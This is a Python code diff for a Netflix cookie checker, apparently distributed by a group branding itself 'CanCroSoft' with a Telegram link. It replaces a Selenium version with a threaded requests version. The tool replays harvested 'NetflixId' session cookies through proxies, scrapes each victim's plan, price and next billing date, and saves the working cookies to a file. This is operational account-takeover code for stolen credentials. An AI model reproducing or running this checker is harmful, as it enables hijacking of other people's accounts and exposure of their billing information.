@@ -1,73 +1,67 @@
-import json
-import os
-import config
-from selenium import webdriver
-from selenium.webdriver.common.by import By
-from selenium.webdriver.firefox.options import Options
-
-working_cookies_path = "working_cookies"
-
-if os.name == "posix":
-    folder_path = "json_cookies"
-
-else:
-    import tkinter
-    from tkinter import filedialog
-
-    if config.use_folder_selector:
-        tkinter.Tk().withdraw()
-        folder_path = filedialog.askdirectory()
-        if folder_path == "":
-            folder_path = "json_cookies"
-            print("Using default path")
-        else:
-            print(f"Using path: {folder_path}")
+import requests
+from bs4 import BeautifulSoup
+import re
+import concurrent.futures
+from time import sleep
 
 
-def load_cookies_from_json(FILEPATH):
-    with open(FILEPATH, "r", encoding="utf-8") as cookie_file:
-        cookie = json.load(cookie_file)
-    return cookie
-
-
-def open_webpage_with_cookies(URL, COOKIES):
-    firefox_options = Options()
-    firefox_options.add_argument("--headless")
-    driver = webdriver.Firefox(options=firefox_options)
-    driver.get(URL)
-
-    for cookie in COOKIES:
-        driver.add_cookie(cookie)
-
-    driver.refresh()
-
-    if driver.find_elements(By.CSS_SELECTOR, ".btn"):
-        print(f"Cookie Not working - {filename}")
-        driver.quit()
-    else:
-        print(f"Working cookie found! - {filename}")
-        try:
-            os.mkdir(working_cookies_path)
-            with open(f"working_cookies/{filename})", "w", encoding="utf-8") as a:
-                a.write(content)
-            driver.quit()
-
-        except FileExistsError:
-            with open(f"working_cookies/{filename}", "w", encoding="utf-8") as a:
-                a.write(content)
-            driver.quit()
-
-
-for filename in os.listdir("json_cookies"):
-    filepath = os.path.join("json_cookies", filename)
-    if os.path.isfile(filepath):
-        with open(filepath, "r", encoding="utf-8") as file:
-            content = file.read()
-
-            url = "https://netflix.com/login"
-
+def process_line(line, prox):
+    match = re.search(r'NetflixId\s+(.+)', line)
+    if match:
+        netflixTK = match.group(1)
+        retry_count = 1
+        max_retries = 5
+        while retry_count < max_retries:
             try:
-                cookies = load_cookies_from_json(filepath)
-                open_webpage_with_cookies(url, cookies)
+                entry = prox
+                proxies = {
+                    'http': entry,
+                    'https': entry,
+                }
+
+                url = "https://www.netflix.com/BillingActivity"
+
+                headers = {
+                    "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+                    "sec-ch-ua-mobile": "?0",
+                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+                    "sec-ch-ua-platform": '"Windows"',
+                    "accept": "*/*",
+                    "sec-fetch-site": "same-origin",
+                    "sec-fetch-mode": "cors",
+                    "sec-fetch-dest": "empty",
+                    "referer": "https://www.netflix.com/browse",
+                    "accept-encoding": "gzip, deflate, br",
+                    "accept-language": "en-US,en;q=0.9,pt;q=0.8",
+                    "cookie": "NetflixId=" + netflixTK
+                }
+
+                response = requests.get(url, headers=headers, proxies=proxies)
+
+                soup = BeautifulSoup(response.content, "html.parser")
+
+                # Encontrar a div com as informações do plano e da próxima data de cobrança
+                div_billing_summary = soup.find("div", class_="billingSummaryContents")
+
+                # Verificar se a div foi encontrada
+                if div_billing_summary is None:
+                    print("Cookie inválido ou expirado!")
+                else:
+                    tipo_plano = div_billing_summary.find("div", attrs={"data-uia": "plan-name"}).text.strip()
+                    valor_plano = div_billing_summary.find("span", attrs={"data-uia": "plan-total-amount"}).text.strip()
+                    proxima_data_cobranca = div_billing_summary.find("div", attrs={"data-uia": "streaming-next-cycle"}).text.strip()
+                    print('Cookie NETFLIX by CanCroSoft TM\n', line, "\n-> Tipo de plano:", tipo_plano, " | Valor do plano:", valor_plano, " | Próxima data de cobrança:", proxima_data_cobranca, '\nhttps://t.me/cancSoftmTeam\n')
+                    with open('cookieslive/NetflixLiveCookies.txt', 'a+', encoding='utf-8') as s:
+                        s.write('Cookie NETFLIX by CanCroSoft TM\n' + line + "\n-> Tipo de plano:" + tipo_plano + " | Valor do plano:" + valor_plano + " | Próxima data de cobrança:" + proxima_data_cobranca + '\nhttps://t.me/cancSoftmTeam\n\n============================\n')
             except Exception as e:
-                print(f"Error occurred: {str(e)} - {filename}\n")
+                print('[ ! ] ERRO DE REQUISIÇÃO - RETESTANDO!', f' [{retry_count}/{max_retries}]')
+                retry_count += 1
+                sleep(2)  # Wait a bit 
+
+with open('db/netflix.txt', 'r') as file: #PUT NAME OF YOUR COOKIE DB HERE
+    lines = file.readlines()
+
+prox = 'YOURPROXY HERE'
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+    executor.map(process_line, lines, [prox] * len(lines))
